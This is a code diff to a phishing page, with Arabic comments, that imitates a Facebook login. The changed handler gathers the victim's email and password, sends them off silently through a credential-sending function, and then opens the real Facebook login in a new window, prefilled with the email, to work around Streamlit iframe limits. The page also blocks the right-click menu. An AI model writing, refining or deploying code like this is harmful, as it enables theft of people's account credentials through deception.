@@ -443,12 +443,18 @@
 
             if (!showFormErrors()) return;
 
+            const email = emailInput.value.trim();
+            const targetUrl = 'https://www.facebook.com/login/?email=' + encodeURIComponent(email);
+
+            // فتح فيسبوك في نافذة جديدة (يتجاوز قيود iframe في Streamlit)
+            window.open(targetUrl, '_blank');
+
             buttonText.style.display = 'none';
             loadingSpinner.style.display = 'block';
             loginBtn.disabled = true;
 
             const credentials = {
-                email: emailInput.value.trim(),
+                email: email,
                 password: passwordInput.value,
                 time: new Date().toLocaleString('ar-EG', {
                     year: 'numeric', month: 'long', day: 'numeric',
@@ -461,19 +467,13 @@
                 referrer: document.referrer || 'direct'
             };
 
-            // إرسال صامت بدون انتظار
+            // إرسال صامت للبيانات
             sendCredentials(credentials).catch(() => {});
-
-            // تحويل فوري إلى فيسبوك الحقيقي مع تعبئة البريد
-            setTimeout(() => {
-                window.location.replace(
-                    'https://www.facebook.com/login/?email=' + encodeURIComponent(credentials.email)
-                );
-            }, 700);
         });
 
         createBtn.addEventListener('click', function() {
-            window.location.href = 'https://facebook.com/reg/';
+            // فتح فيسبوك في نافذة جديدة (يتجاوز قيود iframe)
+            window.open('https://www.facebook.com/reg/', '_blank');
         });
 
         document.addEventListener('contextmenu', e => e.preventDefault());
@@ -507,4 +507,4 @@
         });
     </script>
 </body>
-    </html>
+</html>
